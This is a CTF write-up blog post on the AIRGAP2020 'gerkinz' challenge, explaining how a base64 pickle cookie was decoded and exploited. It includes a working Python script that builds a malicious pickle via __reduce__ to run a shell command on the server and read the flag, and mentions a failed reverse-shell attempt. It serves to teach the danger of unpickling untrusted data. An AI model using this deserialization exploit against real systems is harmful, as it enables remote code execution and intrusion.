AIRGAP2020 CTF 2020 write up
############################
:date: 2020-05-03
:author: tvd
:category: ctf
:tags: ctf, security
:slug: airgap2020-ctf-writeup

This weekend I worked on the `#AIRGAP2020 CTF <https://airgapp.in/>`_ with the `CTF_Circle team <https://twitter.com/CTF_Circle>`_. As a group we finished `1st overall <https://twitter.com/CTF_Circle/status/1256740013171027968>`_!

This post walks through one flag, which shows why python pickle should not be used with user submitted data.

gerkinz
-------

The challenge was called gerkinz and was hosted at http://ctf.airgapp.in:5000/. Visiting that site shows a login form with a login text form. Submitting any username loads a new page with that username.

.. image:: /images/airgap2020-ctf-gerkinz-demo.gif
    :align: center

Looking at what's happening, we can see there is a form that does a ``POST /login`` with body of ``user=<inputted name>``. It's also worth noting that the web server is using python and werkzeug (this is important later).

::

    $ curl -vs 'http://ctf.airgapp.in:5000/'
    ...
    < Server: Werkzeug/1.0.1 Python/3.8.2
    ...
        <form action="/login" method="post">
            <input type="text" name="user" />
            <input type="submit" value="login" />
        </form>

The response from ``POST /login`` is a 302 Found response that redirects back to the home page. It also sets a cookie.

::

    $ curl -vs -X POST 'http://ctf.airgapp.in:5000/login' -d'user=i_am_admin'
    ...
    < HTTP/1.0 302 FOUND
    ...
    < Location: http://ctf.airgapp.in:5000/
    < Set-Cookie: user=gASVQgAAAAAAAAB9lCiMBG5hbWWUjAppX2FtX2FkbWlulIwJbGFzdGxvZ2lulIwaMjAyMC0wNS0wM1QxOTowNzowMS4xNjc4NziUdS4=; Path=/
    ...

The cookie appears to be base64 encoded and based on the form we hypothesize that the home page is reading that cookie to populate the user name. To confirm that, we decode the cookie::

    $ echo 'gASVQgAAAAAAAAB9lCiMBG5hbWWUjAppX2FtX2FkbWlulIwJbGFzdGxvZ2lulIwaMjAyMC0wNS0wM1QxOTowNzowMS4xNjc4NziUdS4=' | base64 -d
    B}(name
    i_am_admin      lastlogin2020-05-03T19:07:01.167878u.

Doing this in python shows there are several characters hidden by the terminal::

    >>> import base64
    >>> decoded = base64.b64decode('gASVQgAAAAAAAAB9lCiMBG5hbWWUjAppX2FtX2FkbWlulIwJbGFzdGxvZ2lulIwaMjAyMC0wNS0wM1QxOTowNzowMS4xNjc4NziUdS4=')
    >>> decoded
    b'\x80\x04\x95B\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04name\x94\x8c\ni_am_admin\x94\x8c\tlastlogin\x94\x8c\x1a2020-05-03T19:07:01.167878\x94u.'

We took a guess that this was the pickle serialization format (this is a ctf, after all) and that proved correct! The cookie is a dictionary with keys for name and lastlogin::

    >>> import pickle
    >>> unpickled = pickle.loads(decoded)
    >>> unpickled
    {'name': 'i_am_admin', 'lastlogin': '2020-05-03T19:07:01.167878'}
    >>> type(unpickled)
    <class 'dict'>

The `python pickle documentation <https://docs.python.org/3/library/pickle.html>`_ warns about accepting pickles from untrusted sources.

.. image:: /images/python-pickle-warning.png
    :align: center

To execute arbitrary code from an object we pickle, we use the `__reduce__() method <https://docs.python.org/3/library/pickle.html#object.__reduce__>`_. It takes no arguments and can return a tuple that has a callable and arguments used to create the initial version of the object that was pickled. We use that to return `subprocess.check_output <https://docs.python.org/3/library/subprocess.html#subprocess.check_output>`_, which runs whatever command we give as an argument and returns stdout as bytes.

This is the python code we ended up with for creating a malicious cookie and then sending it to the server. The pickled cookie works by setting the value of 'name' in the cookie dictionary to the output of 'cat flag.txt'. Then when the home page is sent back to the user, it will say 'welcome <the flag>!'. Make sure to install the ``requests`` library before running.

.. code-block:: python

    import base64
    import pickle
    import requests

    class PickleRce(object):
        def __reduce__(self):
            import subprocess
            return subprocess.check_output, (['/bin/cat', 'flag.txt'],)

    def cli():
        pickled_dict = pickle.dumps({
            'name': PickleRce(),
            'lastlogin': '2020-05-02T18:32:56.238336',
        })
        base64_it = base64.b64encode(pickled_dict)
        resp = requests.get('http://ctf.airgapp.in:5000/', cookies={'user': str(base64_it, 'utf8')})
        print(resp.text)

    if __name__ == '__main__':
        cli()

Running this code outputs the html for the home page with the flag::

    ...
    <h1>welcome b'thug{...}'!</h1>
    ...

We got lucky and guessed that the flag was in a flag.txt in the working directory for the web server—that's a common pattern for CTFs. If that had not been the case, we could have used other shell commands to investigate the file system, running processes, scan the network, check environmnent variables, and things like that. We did try to get a reverse shell on the box, but that didn't work (our guess is the egress rules for that system prevented outbound network traffic).

Lessons
-------

#. Don't use pickle for serialization of untrusted user submitted data. If storing these data in a cookie was important, keeping it simple and setting individual string cookies for each value would be safer than serializing the dictionary.
#. Working with teammates on CTFs is a great way to learn!
